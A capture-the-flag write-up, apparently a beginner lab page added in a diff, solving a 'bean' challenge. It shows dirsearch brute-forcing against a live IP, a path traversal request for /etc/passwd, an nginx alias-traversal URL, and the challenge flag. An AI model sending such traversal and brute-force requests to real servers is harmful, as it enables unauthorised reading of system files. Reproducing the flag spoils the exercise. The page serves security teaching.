@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <link rel="stylesheet" href="../../css/Font.css">
+        <link rel="stylesheet" href="css/folderview.css">
+        <script src="js/folderview.js"></script>
+    </head>
+    <body>
+        <img src="../../public/images/CyberSecurity Beginner Career/bean/bean-1.png"/>
+        <p>First, We need to start with directory brute-force using <a href="https://github.com/maurosoria/dirsearch">dirsearch</a></p>
+        <p><code>python3 dirsearch.py -u 52.28.216.196/bean/</code></p>
+        <p>The result will be like that:</p>
+        <p><code>
+            200 -  404B  - /bean/%3f/
+            301 -  185B  - /bean/files  ->  http://52.28.216.196/files/
+            200 -    9KB - /bean/files/
+            200 -  404B  - /bean/index.html
+        </code></p>
+        <p>Now let’s explore this directory <i>/bean/files/</i></p>
+        <img src="../../public/images/CyberSecurity Beginner Career/bean/bean-2.png"/>
+        <p>
+            Then we got all files in this directory. Let’s try to go back to previous directory by using <a href="https://owasp.org/www-community/attacks/Path_Traversal">Path Traversal attack</a>, aims to access files and directories that are stored outside the web root folder. By manipulating variables that reference files with “dot-dot-slash (../)” sequences and its variations or by using absolute file paths, it may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files.
+        </p>
+        <p>
+            <code>52.28.216.196/bean/files/../../../../../../../../../../../etc/passwd</code>
+        </p>
+        <p>We got “404 Not Found”</p>
+        <p>Let’s try <a href="https://github.com/yandex/gixy/blob/master/docs/en/plugins/aliastraversal.md">[nginx alias_traversal]</a>,</p>
+        <img src="../../public/images/CyberSecurity Beginner Career/bean/bean-3.png"/>
+        <p><b>Now let’s get Mr. Bean home</b></p>
+        <p><code>http://52.28.216.196/bean/files../home/</code></p>
+        <p>Here we found the flag</p>
+        <h2><i>
+        FLAG{Nginx_nOt_aLWays_sEcUre_bY_The_waY}
+        </i></h2>
+    </body>
+</html>
